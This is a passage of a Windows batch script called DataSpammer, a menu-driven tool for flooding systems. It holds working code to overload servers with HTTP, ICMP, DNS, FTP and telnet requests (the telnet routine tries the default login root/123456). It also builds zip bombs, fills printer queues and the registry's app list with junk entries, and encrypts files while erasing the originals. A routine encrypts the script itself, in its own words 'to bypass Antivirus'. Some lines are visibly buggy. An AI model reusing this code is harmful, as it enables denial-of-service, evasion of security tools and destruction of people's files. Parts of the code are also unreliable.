    for /f "tokens=3" %%A in ('reg query "HKCU\Software\DataSpammer" /v UsernameHash 2^>nul') do set "storedhash=%%A"
    if not defined storedhash echo Account already exists. && call :sys.lt 4 && goto login.setup

    :: Input Password & Username
    set /p "username.script=Please enter a Username: "
    set "username.script=%username.script: =%"
    for /f "delims=" %%a in ('%powershell.short% -Command "$pass = Read-Host 'Please enter your Password' -AsSecureString; [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass))"') do set "password=%%a"

    echo Hashing the Username and Password...
    for /f "delims=" %%a in ('%powershell.short% -Command "[Text.Encoding]::UTF8.GetBytes('%username.script%') | ForEach-Object { (New-Object -TypeName Security.Cryptography.SHA256Managed).ComputeHash($_) } | ForEach-Object { $_.ToString('x2') } -join '' "') do set "username_hash=%%a"
    for /f "delims=" %%a in ('%powershell.short% -Command "[Text.Encoding]::UTF8.GetBytes('%password%') | ForEach-Object { (New-Object -TypeName Security.Cryptography.SHA256Managed).ComputeHash($_) } | ForEach-Object { $_.ToString('x2') } -join '' "') do set "password_hash=%%a"

    :: Save the hashed values in a secure location
    echo Saving Secure Data...
    reg add "HKCU\Software\DataSpammer" /v UsernameHash /t REG_SZ /d "%username_hash%" /f
    reg add "HKCU\Software\DataSpammer" /v PasswordHash /t REG_SZ /d "%password_hash%" /f

    cls
    echo Account created successfully.
    call :sys.lt 1
    goto restart.script

:encrypt
    :: Encrypt Script Files, to bypass Antivirus
    if %logging% == 1 ( call :log Encrypting_Script WARN )
    echo Encrypting...
    call :sys.lt 1
    cd /d "%~dp0 "
    :: Version Update checks for this File
    call :generateRandom
    reg add "HKCU\Software\DataSpammer" /v Token /t REG_SZ /d "%realrandom%" /f

    (
        @echo off
        cd /d "%~dp0"
        echo FF FE 0D 0A 63 6C 73 0D 0A > temp_hex.txt
        certutil -f -decodehex temp_hex.txt temp_prefix.bin
        move dataspammer.bat original_dataspammer.bat
        copy /b temp_prefix.bin + original_dataspammer.bat dataspammer.bat
        erase original_dataspammer.bat
        erase temp_hex.txt
        erase temp_prefix.bin
        Cipher /E dataspammer.bat
        Cipher /E settings.conf
        cd /d "%~dp0"
        start %powershell.short% -Command "Start-Process 'dataspammer.bat' -Verb runAs"
        erase encrypt.bat
    ) > encrypt.bat
     
    start %powershell.short% -Command "Start-Process 'encrypt.bat' -Verb runAs"
    goto cancel



:switch.elevation
    :: Switch Elevation Method
    echo Choose an Elevation method.
    echo: 
    echo Powershell is the default and recommended option.
    echo Sudo requires Windows 24H2 or higher and must be manually enabled.
    echo Gsudo is a third-party tool and must be installed manually.
    echo:
    echo [1] Powershell
    echo:
    echo [2] sudo (needs 24H2)
    echo:
    echo [3] gsudo (/gerardog/gsudo)
    echo:
    echo: 
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto switch.pwsh.elevation
        if %_erl%==2 goto switch.sudo.elevation
        if %_erl%==3 goto switch.gsudo.elevation
        if %_erl%==4 call :standby
    goto switch.elevation


:switch.sudo.elevation
    :: Switch to Sudo Elevation
    :: Powershell Elevation is more reliable
    :: Windows will support sudo, starting in 24H2
    :: Check for Windows Version 24H2 or higher > where SUDO > start via sudo

    :: https://github.com/microsoft/sudo
    :: https://github.com/microsoft/sudo/blob/main/scripts/sudo.ps1
    :: Query Registry for Windows Version
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "ReleaseId"') do set "release-id=%%a"
    for /f "tokens=3" %%a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v "CurrentBuild"') do set "build=%%a"
    
    :: Version: %release-id%
    :: Build-Number: %build%
    set /a min_build=25900
    if not %build% geq %min_build% (
        :: is lower than 24H2
        echo You dont have Version 24H2 && pause && goto advanced.options
    )
    
    :: Check if Sudo is installed
    for /f "delims=" %%a in ('where sudo') do (
        set "where_output=%%a"
    )
    if not defined where_output (echo You dont have sudo enabled. && pause && goto advanced.options)

    :: Switch to Sudo
    if %logging% == 1 ( call :log Chaning_Elevation_to_sudo WARN )
    call :update_config "elevation" "" "sudo"
    echo Switched to Sudo.
    call :sys.lt 2
    goto restart.script


:switch.pwsh.elevation
    :: Switch to Powershell Elevation
    echo Switching to Powershell Elevation...
    call :sys.lt 2
    if %logging% == 1 ( call :log Chaning_Elevation_to_pwsh WARN )
    call :update_config "elevation" "" "pwsh"
    echo Switched to Powershell.
    call :sys.lt 2
    goto restart.script

:switch.gsudo.elevation
    :: Switch to GSudo Elevation
    echo Switching to GSUDO Elevation...
    call :sys.lt 2
    if %logging% == 1 ( call :log Chaning_Elevation_to_gsudo WARN )
    call :update_config "elevation" "" "gsudo"
    echo Switched to GSudo.
    call :sys.lt 2
    goto restart.script



:spam.settings
    echo [1] Default Filename
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [2] Default Directory
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [3] Default Filecount / Request Count
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [4] Default Domain (HTTPS/DNS)
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [5] Skip Security Question
    call :sys.lt 1
    echo: 
    call :sys.lt 1
    echo [6] Go back
    choice /C 123456S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 if %logging% == 1 ( call :log Chaning_Default_Filename WARN ) && call :update_config "default-filename" "Type in the Filename you want to use:" "" && goto restart.script
        if %_erl%==2 if %logging% == 1 ( call :log Changing_Standart_Directory WARN ) && call :update_config "default_directory" "Type Your Directory Here:" "" && goto restart.script
        if %_erl%==3 if %logging% == 1 ( call :log Chaning_Standart_Filecount WARN ) && call :update_config "default-filecount" "Enter the Default Filecount:" "" && goto restart.script
        if %_erl%==4 if %logging% == 1 ( call :log Chaning_Standart_Domain WARN ) && call :update_config "default-domain" "Enter the Default Domain:" "" && goto restart.script
        if %_erl%==5 goto settings.skip.sec
        if %_erl%==6 goto settings
        if %_erl%==7 call :standby
    goto spam.settings

:settings.skip.sec
    if %logging% == 1 (
        call :log Chaning_Skip_security_question WARN
    )
    set "settings.skip-sec=%skip-sec%"
    if "%settings.skip-sec%"=="1" (
        set "settings.skip-sec=0"
    ) else (
        set "settings.skip-sec=1"
    )
    call :update_config "skip-sec" "" "%settings.skip-sec%"
    if %logging% == 1 (
        call :log Skip_Security_Question_Updated_To_%settings.skip-sec% INFO
    )
    goto restart.script

:settings.version.control
    echo:
    echo:
    call :sys.lt 1
    echo [1] Force Update
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Switch to Main Branch
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Switch to Develop Branch (v6)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Go Back
    call :sys.lt 1
    echo:
    echo:
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 call :update.script stable && goto cancel
        if %_erl%==2 call :update.script stable && goto cancel
        if %_erl%==3 call :update.script beta && goto cancel
        if %_erl%==4 goto settings
        if %_erl%==5 call :standby
    goto settings.version.control


:activate.dev.options   
    if %developermode% == 1 goto dev.options
    echo Do you want to activate the Developer Options?
    echo Developer Options include some advanced features like logging etc.
    echo These Features are experimental can be unstable.
    echo:
    choice /C YNS /T 120 /D S  /M "Yes/No"
        set _erl=%errorlevel%
        if %_erl%==1 goto write-dev-options
        if %_erl%==2 goto settings
        if %_erl%==3 call :standby
    goto activate.dev.options   
    
:write-dev-options
    if %logging% == 1 ( call :log Activating_Dev_Options WARN )
    cd /d "%~dp0"
    call :update_config "developermode" "" "1"
    echo Developer Options have been activated!
    echo Script will now restart
    call :sys.lt 2
    goto restart.script


:settings.logging
    if %logging% == 1 ( call :log Opened_Logging_Settings INFO )
    cls
    if %logging% == 1 ( set "settings.logging=Activated" ) else ( set "settings.logging=Disabled" )
    echo Logging is currently: %settings.logging%
    echo:
    call :sys.lt 1
    echo [1] Activate Logging
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Disable Logging
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Open Log
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] Clear Log
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Go Back
    call :sys.lt 1
    echo:
    echo:
    choice /C 12345S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto enable.logging
        if %_erl%==2 goto disable.logging
        if %_erl%==3 cls && echo Opening Log... & notepad %userprofile%\Documents\DataSpammerLog\DataSpammer.log && pause && goto settings.logging
        if %_erl%==4 cls && erase %userprofile%\Documents\DataSpammerLog\DataSpammer.log && echo Log Cleared. && pause && goto settings.logging
        if %_erl%==5 goto settings
        if %_erl%==6 call :standby
    goto settings.logging


:enable.logging
    if %logging% == 1 ( goto settings.logging )
    call :update_config "logging" "" "1"
    echo Enabled Logging.
    call :sys.lt 2
    goto restart.script

:disable.logging
    if %logging% == 0 ( goto settings.logging )
    if %logging% == 1 ( call :log Disabling_Logging WARN )
    call :update_config "logging" "" "0"
    echo Disabled Logging.
    call :sys.lt 2
    goto restart.script

:ad.settings
    cls
    echo:
    echo =================================
    echo Autostart / Desktop Icon Settings
    echo =================================
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] Setup 
    echo:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Uninstall
    echo:
    call :sys.lt 1
    echo [3] Back
    echo:
    echo:

    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto ad.setup
        if %_erl%==2 goto ad.remove
        if %_erl%==3 goto menu
        if %_erl%==4 call :standby
    goto ad.settings


:ad.remove
    cls
    echo [1] Delete Autostart
    echo:
    call :sys.lt 1
    echo:
    echo [2] Delete Desktop Icon
    echo:
    call :sys.lt 1
    echo:
    echo [3] Back
    echo:
    echo:
    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto autostart.delete
        if %_erl%==2 goto desktop.icon.delete  
        if %_erl%==3 goto ad.settings
        if %_erl%==4 call :standby
    goto ad.remove


:ad.setup
    cls
    echo [1] Start Setup for Autostart
    call :sys.lt 2
    echo:
    call :sys.lt 2
    echo [2] Start Setup for Desktop Icon
    call :sys.lt 2
    echo:
    call :sys.lt 2
    echo [3] Go Back
    call :sys.lt 2
    echo:

    choice /C 123S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto autostart.setup.confirmed
        if %_erl%==2 goto desktop.icon.setup
        if %_erl%==3 goto ad.settings
        if %_erl%==4 call :standby
    goto ad.setup



:autostart.delete
    cd /d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
    del autostart.bat
    echo Autostart Link Removed.
    goto menu

:autostart.setup.confirmed
    >> "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\autostart.bat" echo @echo off && cd /d "%~dp0" && dataspammer.bat
    echo Autostart Link Added.
    goto menu

:desktop.icon.setup
    echo Adding Desktop Icon
    cls
    %powershell.short% -Command ^
     $WshShell = New-Object -ComObject WScript.Shell; ^
     $Shortcut = $WshShell.CreateShortcut('%USERPROFILE%\Desktop\DataSpammer.lnk'); ^
     $Shortcut.TargetPath = '%~0'; ^
     $Shortcut.Save()
    echo Added Desktop Icon
    goto menu

:desktop.icon.delete
    echo Deleting Desktop Icon...
    cls                                                                                              
    erase "%USERPROFILE%\Desktop\DataSpammer.lnk"
    echo Successfully Deleted Desktop Icon.
    goto menu


::
::               /\            /\ 
::                |  SETTINGS  |  
::                |  SPAM PART |
::               \/            \/
::


:start
    if %logging% == 1 ( call :log Opened_Start INFO )
    call :sys.verify.execution
    if %logging% == 1 ( call :log Start_Verified INFO )
    cls

    for /f "delims=" %%a in ('where python') do (
        set "where_output=%%a"
    )
    if not defined where_output (set "python.line=echo:") else ( set "python.line=echo [4] Python Scripts (Experimental)" ) 

:start.verified
    %$Echo% "     ___        _   _
    %$Echo% "    / _ \ _ __ | |_(_) ___  _ __  ___ 
    %$Echo% "   | | | | '_ \| __| |/ _ \| '_ \/ __|
    %$Echo% "   | |_| | |_) | |_| | (_) | | | \__ \
    %$Echo% "    \___/| .__/ \__|_|\___/|_| |_|___/
    %$Echo% "         |_|

    echo [1] Local Machine
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Internet ( LAN / WAN)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Go back
    call :sys.lt 1
    %python.line%
    call :sys.lt 1
    choice /C 1234S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto local.spams
        if %_erl%==2 goto internet.spams
        if %_erl%==3 goto menu
        if %_erl%==4 goto python.spams    
        if %_erl%==4 call :standby
    goto start.verified


:internet.spams
    echo [1] SSH Test (Key-Auth or No Password)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] DNS Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] FTP Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] HTTP(S) Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Printer Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [6] ICMP Test (ping)
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [7] Telnet
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [8] Printer List Test
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [9] Go Back
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo:
    choice /C 12345678S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto ssh.spam
        if %_erl%==2 goto dns.spam
        if %_erl%==3 goto ftp.spam
        if %_erl%==4 goto https.spam
        if %_erl%==5 goto printer.spam
        if %_erl%==6 goto icmp.spam
        if %_erl%==7 goto telnet.spam
        if %_erl%==8 goto printer.list.spam
        if %_erl%==9 goto start.verified
        if %_erl%==10 call :standby
    goto internet.spams

:python.spams
    echo [1] Zip Bomb Creator
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Go Back
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo:
    choice /C 12S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto python.zip.bomb
        if %_erl%==2 goto start.verified
        if %_erl%==3 call :standby
    goto python.spams

:python.zip.bomb
    cd "%~dp0"

    :python.zip.bomb.sub
    call :filename.check zipname "Filename (with .zip): "
    set /P MB=Filesize (in MB): 
    set /P COUNT=How many Files in the Base layer?:
    set /A BYTES=%MB% * 1024 * 1024
    
    (
        echo import zipfile
        echo nullbytes = b'\x00' * %BYTES%
        echo filename = "%zipname%"
        echo with zipfile.ZipFile(filename, "w", compression=zipfile.ZIP_DEFLATED^) as zipf:
        echo ^    for i in range(%COUNT%):
        echo ^        zipf.writestr(f"data_%%03d.bin" %% i, nullbytes)
    ) > "%~dp0\zip.py"

    python "%~dp0\zip.py"
    erase "%~dp0\zip.py"

:printer.list.spam
    set /P printer.name=Enter the Printer Name:
    set /P printer.model=Enter the Modell(can be anything):
    set /P printer.count=Enter the Printer Count:
    for /L %%i in (1,1,%printer.count%) do (
        set "count=%%i"
        RUNDLL32 printui.dll,PrintUIEntry /if /b "!printer.name!!count!" /f "%windir%\inf\ntprint.inf" /m "%printer.model%"
        echo Added Printer !printer.name!!count!
    )
    call :done "The Script has added the Printer %printer.name% with the Model %printer.model% and the Count %printer.count%"
    
:telnet.spam
    echo root > temp.txt
    echo 123456 >> temp.txt
    echo exit >> temp.txt

    if "%default-domain%"=="notused" set /P telnet.target=Enter the Target:
    if not "%default-domain%"=="notused" set "telnet.target=%default-domain%"
    
    if "%default-filecount%"=="notused" set /P telnet.count=How many Requests should be made
    if not "%default-filecount%"=="notused" set "telnet.count=default-domain"

    for /L %%i in (1,1,%telnet.count%) do (
        telnet %telnet.target% 23 < input.txt
    )
    
    del temp.txt
    if %logging% == 1 ( call :log Finished_Telnet_Spam_on_%telnet.target% INFO )
    call :done "The Script Tested the Telnet Server %telnet.target% with %telnet.count% Requests"

    
:icmp.spam
    if "%default-domain%"=="notused" set /P icmp.target=Enter the Target:
    if not "%default-domain%"=="notused" set "icmp.target=%default-domain%"
    
    set /P icmp.rate=Enter the rate (milliseconds between requests):
    
    echo Press CTRL+C to stop
    call :sys.lt 3
    
    :icmp.loop
    ping %icmp.target% -n 1 -w %icmp.rate%
    if %logging% == 1 ( call :log Sending_ICMP_Request_to_%icmp.target% INFO )
    goto icmp.loop

    if %logging% == 1 ( call :log Finished_ICMP_Spam_on_%icmp.target% INFO )
    call :done "The Script Tested %icmp.target% with %icmp.rate% milliseconds interval"

:local.spams
    echo Choose the Method you want to use:
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [1] .txt Spam in custom Directory
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [2] Desktop Icon Spam
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [3] Startmenu Spam
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [4] App-List Spam
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [5] Encrypt / Decrypt File/Directory
    call :sys.lt 1
    echo:
    call :sys.lt 1
    echo [6] Go Back
    echo:
    echo:
    echo:
    choice /C 12345S /T 120 /D S  /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto normal.text.spam
        if %_erl%==2 goto desktop.icon.spam
        if %_erl%==3 goto startmenu.spam
        if %_erl%==4 goto app.list.spam
        if %_erl%==5 goto crypt.spam
        if %_erl%==6 goto start.verified
        if %_erl%==7 call :standby
    goto local.spams

:crypt.spam
    echo Original Files will be REMOVED
    echo Encrypt or Decrypt?
    choice /C ED /M "(E)ncrypt or (D)ecrypt):"
        set _erl=%errorlevel%
        if %_erl%==1 goto encrypt.spam
        if %_erl%==2 goto decrypt.spam
    goto crypt.spam


:encrypt.spam
    echo Folder or File?
    choice /C FD /M "(F)ile or (D)irectory):"
        set _erl=%errorlevel%
        if %_erl%==1 goto encrypt.spam.file
        if %_erl%==2 goto encrypt.spam.folder
    goto encrypt.spam


:decrypt.spam
    echo Folder or File?
    choice /C FD /M "(F)ile or (D)irectory):"
        set _erl=%errorlevel%
        if %_erl%==1 goto decrypt.spam.file
        if %_erl%==2 goto decrypt.spam.folder
    goto decrypt.spam 



:encrypt.spam.folder
    call :directory.input encrypt-dir "Enter the Directory: "
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"
    set /p encrypt-key=Enter the Encryption Key:
    set /p encrypt-key-2=Repeat the Encryption Key:

:encrypt.spam.folder.passwd
    set /p encrypt-key=Enter the Encryption Key:
    set /p encrypt-key-2=Repeat the Encryption Key:
    if not "%encrypt-key%"=="%encrypt-key-2%" goto encrypt.spam.folder.passwd


    echo Encrypting files in "%encrypt-dir%"...
    for %%f in ("%encrypt-dir%\*") do (
        if /I not "%%~xf"==".enc" (
            echo Encrypting file: %%f
            if "%crypt.method%"=="aes-256-cbc" (
                openssl enc -aes-256-cbc -salt -in "%%f" -out "%%f.enc" -pass pass:%encrypt-key% -iter 100000
            ) else (
                openssl enc -chacha20 -salt -in "%%f" -out "%%f.enc" -pass pass:%encrypt-key% -iter 100000
            )
            erase "%%f" >nul 2>&1
            echo File "%%f" encrypted to "%%f.enc".
        )
    )
    
    echo All files encrypted.
    
    echo Waiting 2 Seconds...
    call :sys.lt 4
    goto menu


:encrypt.spam.file
    set /p encrypt-dir=Enter the File Directory:
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"

:encrypt.spam.file.passwd
    set /p encrypt-key=Enter the Encryption Key:
    set /p encrypt-key-2=Repeat the Encryption Key:
    if not "%encrypt-key%"=="%encrypt-key-2%" goto encrypt.spam.file.passwd

    echo Encrypting file: %encrypt-dir%
    if "%crypt.method%"=="aes-256-cbc" (
        openssl enc -aes-256-cbc -salt -in "%encrypt-dir%" -out "%encrypt-dir%.enc" -pass pass:%encrypt-key%  -iter 100000
    ) else (
        openssl enc -chacha20 -salt -in "%encrypt-dir%" -out "%encrypt-dir%.enc" -pass pass:%encrypt-key% -iter 100000
    )
    erase "%encrypt-dir%" >nul 2>&1
    echo File "%encrypt-dir%" encrypted to "%encrypt-dir%.enc".
    echo Encrypted with %crypt.method%
    echo Waiting 2 Seconds...    
    call :sys.lt 4
    goto menu

:decrypt.spam.folder
    call :directory.input encrypt-dir "Enter the Directory: "
    set /p decrypt-key=Enter the Encryption Key:
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"

    echo Decrypting files in "%encrypt-dir%"...
    for %%f in ("%encrypt-dir%\*.enc") do (
        echo Decrypting file: %%f
    
        if "%crypt.method%"=="aes-256-cbc" (
            openssl enc -d -aes-256-cbc -salt -in "%%f" -out "%%f.dec" -pass pass:%encrypt-key% -iter 100000
        ) else (
            openssl enc -d -chacha20 -in "%%f" -out "%%f.dec" -pass pass:%encrypt-key% -iter 100000
        )
    
        echo File "%%f" decrypted to "%%f.dec".
    )
    
    echo All files decrypted.

    echo Waiting 2 Seconds...
    call :sys.lt 4
    goto menu


:decrypt.spam.file
    set /p decrypt-dir=Enter the File Directory:
    set /p decrypt-key=Enter the Encryption Key:
    echo Enter the Encryption Method
    choice /C AC /M "(A)ES or (C)hacha):"
        set _erl=%errorlevel%
        if %_erl%==1 set "crypt.method=aes-256-cbc"
        if %_erl%==2 set "crypt.method=chacha20"

    echo Decrypting file: %encrypt-dir%
    
    if "%crypt.method%"=="aes-256-cbc" (
        openssl enc -d -aes-256-cbc -salt -in "%encrypt-dir%" -out "%encrypt-dir%.dec" -pass pass:%encrypt-key% -iter 100000
    ) else (
        openssl enc -d -chacha20 -in "%encrypt-dir%" -out "%encrypt-dir%.dec" -pass pass:%encrypt-key% -iter 100000
    )
    
    echo File "%encrypt-dir%" decrypted to "%encrypt-dir%.dec".  
    echo Waiting 2 Seconds...    
    call :sys.lt 4c
    goto menu
   


:printer.spam
    :: print /D:%printer% %file%
    :: set printer="\\NetworkPrinter\PrinterName"
    if "%default-filecount%"=="notused" set /P printer.count=How many Files should be printed
    if not "%default-filecount%"=="notused" set "printer.count=default-domain"

    call :filename.check print.filename "Enter the Filename:"

    cls
    wmic printer get Name
    set /P printer-device=Choose a Device (full name):

    set /P printer.content=Enter the Content:
    cd /d "%~dp0"
    >> "%~dp0\%print.filename%.txt" echo %printer.content%

    for /L %%i in (1,1,%printer.count%) do (
        print %print.filename%.txt
        print /D:"%printer-device%" %print.filename%.txt
    )
    if %logging% == 1 ( call :log Finished_Printer_Spam:%printer.count%_Requests_on_default_Printer INFO )
    erase %print.filename%.txt
    call :done "The Script Created %printer.count% to Default Printer"



:https.spam
    setlocal EnableDelayedExpansion
    echo Spam a HTTP/HTTPS Server with Requests
    if "%default-domain%"=="notused" set /P url=Enter a Domain or an IP:
    if not "%default-domain%"=="notused" set "url=default-domain"
    if "%default-filecount%"=="notused" set /P requests=How many requests should be made:
    if not "%default-filecount%"=="notused" set "requests=default-domain"

    for /L %%i in (1,1,%requests%) do (
        echo Sending Request %%i of %requests% to %url%
        curl -s -o NUL -w "Status: %{http_code}\n" !url!
    )

    if %logging% == 1 ( call :log Finished_HTTPS_Spam:%requests%_Requests_on_%url% INFO )
    call :done "The Script Created %requests% to %url%"


:dns.spam
    setlocal EnableDelayedExpansion    
    echo DNS-Spam is useful if you have a local DNS Server running (PiHole, Adguard etc.)
    set /P domain_server=Enter the DNS-Server IP (leave empty for default):
    if "%default-domain%"=="notused" set /P domain=Enter the Domain:
    if not "%default-domain%"=="notused" set "domain=%default-domain%"

    if "%default-filecount%"=="notused" set /P request_count=Enter the Request Count:
    if not "%default-filecount%"=="notused" set "request_count=%default-filecount%"
    
    if not defined domain_server set "domain_server= "
    
    cls
    echo Now enter the Record type. A for IPv4 and AAAA for IPv6. Use A if unsure.
    set /P record_type=Enter the DNS Record Type (A or AAAA):
    
    set /a x=1
    
    if /I "%record_type%"=="A" goto dns.a
    if /I "%record_type%"=="AAAA" goto dns.aaaa
    
    
:dns.a
    for /L %%i in (1, 1, %request_count%) do (
        echo Created !x! DNS Request for !record_type! record.
        set /a x+=1
        nslookup -type=A %domain% %domain_server% > nul
        cls
    )
    goto dns.done
    
:dns.aaaa
    for /L %%i in (1, 1, %request_count%) do (
        echo Created !x! DNS Request for !record_type! record.
        set /a x+=1
        nslookup -type=AAAA %domain% %domain_server% > nul
        cls
    )
    

:dns.done
    if %logging% == 1 ( call :log Finished_DNS_Spam:%request_count%_Requests_on_%domain_server% INFO )
    call :done "The Script Created %request_count% for %domain% on %domain_server%"

    

:ftp.spam
    cls
    set /P ftpserver=Enter a Domain or IP:
    set /P username=Enter the Username:
    set /P password=Enter the Password:
    set /P remoteDir=Enter the Directory (leave empty if unsure):
    call :filename.check filename "Enter the Filename:"

    set /P content=Enter the File Content:

    if "%default-filecount%"=="notused" set /P filecount=How many Files should be created:
    if not "%default-filecount%"=="notused" set "filecount=%default-filecount%"
    
    echo %content% > %filename%.txt
    
    :: Creates Files on local Machine
    echo Creating Files...
    set /a w=1
    cd /d "%temp%"
    for /l %%i in (1,1,%filecount%) do (
        >> "%temp%\%filename%%x%.txt" echo %content%
        set /a w+=1
    )

    
    :: Create FTP Command File 
    set ftpCommands=ftpcmd.txt
    echo open %ftpserver% > %ftpCommands%
    echo %username% >> %ftpCommands%
    echo %password% >> %ftpCommands%
    echo binary >> %ftpCommands%
    echo cd %remoteDir% >> %ftpCommands%
    
    :: Write Filenames in Command File
    setlocal EnableDelayedExpansion    
    set /a x=1
    for /l %%i in (1,1,%filecount%) do (
        set localFile=%filename%!x!.txt
        echo put !localFile! >> %ftpCommands%
        set /a x+=1
    )
    
    :: Finish Command File & Execute on Host
    echo bye >> %ftpCommands%
    cls && echo Establishing FTP Connection to %ftpserver%...
    ftp -n -s:%ftpCommands%
    
    :: Remove Files on local Machine
    del %ftpCommands%   
    set /a y=1
    cd /d "%temp%"
    for /l %%i in (1,1,%filecount%) do (
        erase %filename%%x%.txt
        set /a y+=1
    )
    
    if %logging% == 1 ( call :log Finished_FTP_Spam:_%filecount% INFO )
    call :done "The Script Created %filecount% Files on the FTP Server: %ftpserver%"



:app.list.spam
    cls
    echo This Function will spam the Applist under "Settings > Apps > Installed Apps" with Entrys of your choice.
    echo:
    echo [1] Continue
    echo:
    echo [2] Go Back
    echo:
    echo:
    choice /C 12 /M "Choose an Option from Above:"
        set _erl=%errorlevel%
        if %_erl%==1 goto app.list.spam.confirmed
        if %_erl%==2 goto start.verified
    goto app.list.spam

:app.list.spam.confirmed
    echo Enter random to use random Numerals
    echo Enter default to skip an Option
    set /P app.spam.name=Enter the App Name:
    echo:
    set /P app.spam.app.version=Enter the App Version:
    echo:
    set /P app.spam.path=Enter the Path of the App (any File):
    echo:
    set /P app.spam.publisher=Enter the Publisher:
    echo:
    set /P app.spam.filecount=How many Entrys should be created:
    
    for /f %%R in ('call :generate_random all 15') do set "random1=%%R"
    for /f %%R in ('call :generate_random all 15') do set "random2=%%R"
    for /f %%R in ('call :generate_random all 15') do set "random3=%%R"

    if %app.spam.name% == random set "app.spam.name=%random1%"
    if %app.spam.app.version% == random set "app.spam.app.version=%random2%"
    if %app.spam.path% == random set "app.spam.path=%~f0"
    if %app.spam.publisher% == random set "app.spam.publisher=%random3%"
    if %app.spam.name% == default set "app.spam.name=DataSpammer"
    if %app.spam.app.version% == default set "app.spam.app.version=%current-script-version%"
    if %app.spam.path% == default set "app.spam.path=%~f0"
    if %app.spam.publisher% == default set "app.spam.publisher=DataSpammer"
    set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%app.spam.name%"
    if defined ProgramFiles(x86) (
        set "RegPath=HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%app.spam.name%"
    )
    

:app.spam.start.top
    set /a x+=1

    reg add "%RegPath%" /v "DisplayName" /d "%app.spam.name%%x%" /f
    reg add "%RegPath%" /v "DisplayVersion" /d "%app.spam.app.version%" /f
    reg add "%RegPath%" /v "InstallLocation" /d "%app.spam.path%" /f
    reg add "%RegPath%" /v "Publisher" /d "%app.spam.publisher%" /f
    reg add "%RegPath%" /v "UninstallString" /d "%~dp0\dataspammer.bat remove" /f

    echo Created %x% Entry(s).
    if %x% equ %app.spam.filecount% ( goto app.spam.done ) else ( goto app.spam.start.top )

:app.spam.done
    if %logging% == 1 ( call :log Finished_Spamming_Files:_%filecount% INFO )
    call :done "The Script Created %x% Entrys."


:startmenu.spam
    set /P filecount=How many Files should be created?:
    echo Only for Local User or For All Users?
    echo All Users requires Admin Privileges.
    choice /C AL /M "(A)ll / (L)ocal"
    set _erl=%errorlevel%
        if %_erl%==1 goto spam.all.user.startmenu
        if %_erl%==2 goto spam.local.user.startmenu
    goto startmenu.spam

:spam.local.user.startmenu
    set "directory.startmenu=%AppData%\Microsoft\Windows\Start Menu\Programs"
    goto startmenu.custom.name

:spam.all.user.startmenu
